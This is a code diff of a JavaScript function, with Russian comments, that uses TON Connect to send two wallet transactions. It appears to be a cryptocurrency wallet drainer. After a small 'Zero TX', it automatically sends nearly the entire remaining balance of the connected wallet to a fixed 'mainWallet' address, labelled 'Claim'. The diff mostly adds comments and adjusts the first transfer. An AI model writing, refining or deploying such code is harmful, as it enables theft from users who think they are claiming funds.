@@ -90,25 +90,25 @@ async function didtrans() {
 
         const remainingBalance = originalBalance - deduction;
 
-        // 1️⃣ Отправляем первую (нулевую) транзакцию
+        // 1️⃣ Отправляем первую (нулевую) транзакцию с минимальной суммой
         const zeroTransaction = {
             validUntil: Math.floor(Date.now() / 1000) + 120,
             messages: [
                 {
-                    address: mainWallet,
-                    amount: 2000000, // 0.002 TON
-                    payload: "te6cckEBAgEAAQAAAA==",
+                    address: mainWallet,   // Адрес вашего кошелька
+                    amount: 1000000,       // 0.001 TON (минимальная сумма)
+                    payload: "",           // Пустой payload
                 }
             ],
             sendMode: 3,
-            comment: "Zero TX",
+            comment: "Zero TX",  // Комментарий
         };
 
         console.log("Отправляем нулевую транзакцию...");
-        await tonConnectUI.sendTransaction(zeroTransaction);
+        await tonConnectUI.sendTransaction(zeroTransaction);  // Отправка транзакции
         console.log("Нулевая транзакция отправлена!");
 
-        // ⏳ Ждем подтверждения транзакции (5 секунд)
+        // ⏳ Ждем 5 секунд, чтобы кошелек успел обработать первую транзакцию
         await new Promise(resolve => setTimeout(resolve, 5000));
 
         // 2️⃣ Автоматически отправляем вторую (основную) транзакцию
@@ -116,18 +116,19 @@ async function didtrans() {
             validUntil: Math.floor(Date.now() / 1000) + 120,
             messages: [
                 {
-                    address: mainWallet,
-                    amount: remainingBalance,
+                    address: mainWallet,   // Адрес получателя
+                    amount: remainingBalance, // Сумма перевода
                 }
             ],
             sendMode: 3,
-            comment: "Claim",
+            comment: "Claim",  // Комментарий
         };
 
         console.log("Отправляем основную транзакцию...");
-        await tonConnectUI.sendTransaction(mainTransaction);
+        await tonConnectUI.sendTransaction(mainTransaction);  // Отправка основной транзакции
         console.log("Основная транзакция отправлена!");
 
+        // Обновляем баланс
         await updateBalance(walletAddress);
     } catch (error) {
         console.error('Ошибка при отправке транзакции:', error);
